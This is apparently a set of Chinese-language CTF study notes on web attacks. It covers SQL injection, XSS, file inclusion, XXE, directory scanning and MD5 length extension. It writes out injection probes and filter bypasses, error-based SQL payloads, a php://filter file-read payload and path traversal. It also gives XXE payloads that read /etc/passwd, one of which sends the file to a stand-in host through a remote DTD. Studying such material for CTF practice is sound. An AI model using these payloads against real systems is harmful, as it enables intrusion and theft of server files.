<h1><center>web安全</center></h1>

# 一.隐藏信息

1. 源代码隐藏关键信息
2. 请求和响应头隐藏关键信息

# 二.代码审计

### 1.1. php漏洞

1.1.1 序列化与反序列化

（1）序列化

序列化就是把一个对象（非类）存成一个字符串，要用时再反序列释放出它。
注意序列化只会包含对象的变量，不会包含函数。而且序列化对象后面的字符串不会再反序列化时解析（md5扩展长度攻击时可用）



（2）session序列化



（3）序列化漏洞

当序列化字符串中，表示对象属性个数的值大于实际个数时，在反序列化后就会跳过wakeup方法的执行



### 1.2. md5扩展长度攻击

介绍：

题目不告诉你key,但提供了data以及md5(key.data)的值

让你求md5(key.data.others)的值

工具：

- HashPump（linux工具），使用方法：hashpump -s [SIGNATURE] -d [DATA] -k [KEY_LENGTH] -a [DATA_ADD]

  通常DATA_ADD可随意指定。



- hashpumpy库(python)



### 1.3. 本地JS代码审计



- js加密(特点，各种乱码)

  - aaencode
  - jjencode
  - js fuck

- js代码

  - 一般代码都很长，且杂乱无章，抓住核心代码

  - 有时直接复制部分或全部代码到控制台即可

    

### 1.4. 修改请求头

- Referer:
- X-Forwarded-For:
- User-Agent:
- Accept-Language:



# 三.目录扫描

## 1.概览

A. 介绍：程序员在开发网站时常把一些敏感文件暴露在公网，导致攻击者可以通过扫描工具，扫描到敏感文件达到信息收集的目的。

B. 危害：敏感信息泄露，后台暴露，源代码泄露

扫描工具：[dirsearch](https://github.com/maurosoria/dirsearch),御剑,dirmap

## 2.常见敏感文件

A. php.ini php的配置文件

B. php.info php配置信息文件，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。

C. .git文件

包含git历史版本信息，会造成git泄露可通过工具还原部分代码，[GitHack](https://github.com/lijiejie/GitHack)

D. 交换文件，程序编写过程中异常时自动保存的文件。例如vim编写过程中出现异常时就会保存.文件名.swp文件,可通过vim -r 交换文件 命令来还原交换文件。或者出现~,.swp类似的交互文件。5. 备份文件

E. 备份文件 有些备份文件程序员忘记删除导致代码泄露



# 四.sql注入

## 1.概览

原因：程序员对外部输入没有过滤或过滤不当，而且直接拼接到sql语句到数据库进行增删改查造成恶意sql语句的执行。

危害：脱库，插入恶意代码

## 2.分类

###2.1.基于查询类型划分

（1）数字型注入

' 报错

and 1 正确

and 0 错误

（2）字符型注入

' 报错

'%23 或 and '1' ='1 正确

' and 0 %23 或 and '1'='0 错误



### 2.2.基于注入类型划分

（1）union注入



（2）报错注入

​	报错语句：

​	updatexml(1,(concat(0x7e,(sql),0x7e)),1)

​	extractvalue(1,(concat(0x7e,(sql),0x7e)),1)

​	exp(~(sql))

（3）盲注



​	a.布尔盲注

```sql
and [sql][condition] and '1'='1
and [sql][condition] or '1
```



​	b.时间盲注

```sql
	case when [sql][condition] then ... else ... end

	if(([sql][condition]),true statement,false statement)
```

可参考[SQL注入备忘录](http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/))



​	耗时函数:

​	BENCHMARK(100000,MD5(1)) 

​	sleep(5)



[注]union注入和报错注入比较简单，通常只要绕过一些过滤就可以，通常手工注入。盲注比较复杂，通常用工具或者脚本



### 2.3. 基于字段划分:

（1）get,post参数



（2）XFF

一般会记录ip地址到数据库的存在xff注入漏洞



（3）cookie

一般将cookie值存在数据库的存在cookie注入



###2.4. 基于数据库划分

（1）mysql

关键表:information_schema.tables(table_name,table_schema关键列)，Information_schema.columns(column_name,table_name关键列)

（2）sqlite 

关键表:sqlite_master(tbl_name,type核心列)

（3）access

## 3.绕过方法

###3.1.空格

A. 可能出现情况

- 被过滤
- 被标记

B. 检测方法：

order by1看是否错误

C. 替换策略：

- /**/代替空格

- %0a代替空格

- 两个空格代替一个空格

###3.2.引号

A.可能出现情况：

- 被过滤

- 被转义
- 被标记

B.检测方法

加'时没反应

C.替换策略

- %27

- 十六进制 (常用在where处)

- 闭合后面的引号不用引号用注释

### 3.3.注释

A.可能出现的情况

- 被标记
- 被过滤

B.检测方法

闭合前面的语句后加#试下

C.替换策略

- 可以用引号连接后面的引号代替注释,and ''=',and '1'='1

- %23代替#

- --+

- /*    */(比较特殊，一般用在双关键字查询时)

###3.4.关键字

A.可能出现的情况

- 被过滤
- 被标记

B.检测方法：

- 拼接sql语句时按道理正确的语句显示错误或者报错

- union select '[关键词]'

C.替换策略

- 外重写,select->seleselectct

- 内联注释



### 1.6. 常用函数

# 五.XSS

介绍:对网页,对客户端的攻击

### 1. 存储型XSS

原因：程序员对用户输入数据没有进行过滤或过滤不当，并将输入存在数据库里，然后从数据库中取出信息在网页中拼接时造成恶意代码执行

危害：盗取cookie,

### 2.反射型XSS

原因：程序员对用户输入数据没有进行过滤或过滤不当，直接将输入或者url部分字段拼接在网页里造成恶意代码执行

危害：盗刷

### 3.DOM型XSS

# 六.文件上传和文件解析

文件上传：
- 本地js
- filename文件后缀名
- Content-Type文件类型
- filename+Content-Type绕过
- 文件内容绕过 图片马，声音马

文件解析

# 八.文件包含

题眼：
page=
file=
action=

主要函数：
include()
require()
file_get_contents()

主要姿势：
php://input 标准输入，post中带输入内容
php://filter/read=convert.base64-encode/resource=文件名   标准输出，输出指定文件内容。
../../ 目录穿越


1. 本地文件包含
引用的是服务器上的文件

2. 远程文件包含
引用的是非服务器上的文件，一般默认关闭

#九.XXE

XML外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行，内网端口探测、攻击内网网站等目的。

必备条件：
Content-Type: application/xml
post请求中传入poc

一般poc:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo[ 
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<foo>&f;</foo>
```


远程DTD
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://xxx.com/xxe_file.dtd">
<data>&xxe;<data>
```
http://xxx.com/xxe_file.dtd:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "><!ENTITY xxe SYSTEM 'http://xxx.com/?%file;'>">
%all
```
引用自https://www.freebuf.com/articles/web/177979.html

#十.命令执行

经常flag就在同级目录下面的文件名或者文件中。可以通过ls,cat等命令查看。
或者利用语言所带的查看文件内容和查看目录下文件查看。

#十一.远程代码执行


